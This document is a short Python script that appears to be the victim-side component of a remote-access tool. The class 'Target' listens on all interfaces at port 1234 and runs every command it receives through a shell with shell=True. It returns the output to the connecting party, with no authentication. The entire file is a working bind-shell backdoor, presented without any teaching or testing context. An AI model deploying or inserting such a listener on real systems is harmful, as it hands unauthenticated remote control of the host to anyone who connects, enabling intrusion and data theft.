
import socket
import subprocess as sp

class Target:
    def __init__(self):
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_host = None
        self.server_port = None
        self.server_addr = None

    def listen(self, host, port):
        self.server_host = host
        self.server_port = port
        self.server_addr = (host, port)

        self.server_socket.bind(self.server_addr)
        self.server_socket.listen()
        print(f"[+] server listening on port {self.server_port}")

        while True:
            print(f"[+] waiting for connection")
            client_socket, client_addr = self.server_socket.accept()
            print("[+] connection accepted from {}:{}".format(*client_addr))

            while True:
                command = client_socket.recv(1024).decode()

                if "kill server" in command:
                    break

                result = sp.run(command,
                                shell=True,
                                stdout=sp.PIPE,
                                stderr=sp.PIPE,
                                text=True
                )

                client_socket.sendall(result.stdout.encode())

            client_socket.close()
            break

if __name__  == "__main__":
    server = Target()
    host = "0.0.0.0"
    port = 1234
    server.listen(host, port)
